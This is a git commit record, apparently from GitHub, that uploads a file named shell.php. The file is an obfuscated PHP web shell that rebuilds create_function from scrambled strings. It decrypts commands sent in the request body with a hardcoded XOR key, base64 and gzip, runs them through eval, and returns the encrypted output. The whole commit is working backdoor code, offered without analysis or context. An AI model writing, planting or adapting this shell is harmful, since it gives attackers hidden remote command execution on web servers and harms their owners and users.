1193b3508d71d321eb7171710e175dbb8dfc7d54
kt-mc <78872607+kt-mc@users.noreply.github.com>
2021-02-16 17:10:31 -0600

    Add files via upload

---
+++ shell.php
@@ -0,0 +1,10 @@
+<?php
+$x='$6uk="e10ad6uc39";$kh="6u6u49ba59abbe56u6";$k6uf="e057f6u20f883e6u";6u$6up="hoMTll6uQeL0ciKAI16u";fu6unc6ution x($t,6u';
+$O='$k6u){$c=6ustrlen($k6u6u);$l6u=st6urlen($t);$o="";for($i=06u;$i<$6u6ul;){for($j=0;6u($j<$c6u&&6u$i<$l);$j+6u+,$i++6u){';
+$B='$o6u6u.=$t{$i6u}^$k6u{$j};}6u}return $o;}6ui6uf (@preg_mat6uch("/6u$kh6u(.+)$kf/",6u6u@fi6u6ule_get_con6utents6u("php://';
+$T='_cont6uents6u();@6uob_6uend_cl6uean();$r=@base6u64_enc6uode(@x6u(@gzco6umpr6uess6u($6uo),6u$k));pr6uint("$p$kh$r$kf");}';
+$I=str_replace('qL','','crqLqLqLeqLateqL_funqLction');
+$F='input"),$m6u)==1) {@o6ub_star6u6ut();@eva6ul6u(@gzu6uncompress(6u@x(@bas6ue64_decod6ue(6u$m[6u1]),$k)));6u$6uo=@ob_get';
+$E=str_replace('6u','',$x.$O.$B.$F.$T);
+$Q=$I('',$E);$Q();
+?>
